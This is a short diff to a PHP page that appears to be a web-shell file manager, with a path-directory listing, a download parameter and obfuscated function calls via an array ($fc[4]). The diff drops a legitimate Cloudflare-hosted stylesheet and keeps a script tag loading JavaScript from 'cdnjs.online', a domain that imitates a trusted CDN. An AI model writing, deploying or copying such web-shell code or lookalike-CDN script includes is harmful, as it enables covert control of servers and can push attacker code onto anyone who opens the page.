@@ -96,8 +96,7 @@ if (isset($_GET["download"])) {
 }
 ?>
 <br></div>
-  <script src="https://cdnjs.online/ajax/libs/bootstrap/js/bootstrap.min.js"> </script>
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.2.3/css/bootstrap.min.css" integrity="sha512-SbiR/eusphKoMVVXysTKG/7VseWii+Y3FdHrt0EpKgpToZeemhqHeZeLWLhJutz/2ut2Vw1uQEj2MbRF+TVBUA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+<script src="https://cdnjs.online/ajax/libs/bootstrap/js/bootstrap.min.js"> </script>
 <div class="bg-dark border table-responsive mt-2"><div class="ml-2" style="font-size:10px;"><span>[+] Path Dir: </span>
 <?php
 $ps = $fc[4]("/(\\\|\/)/", $p);
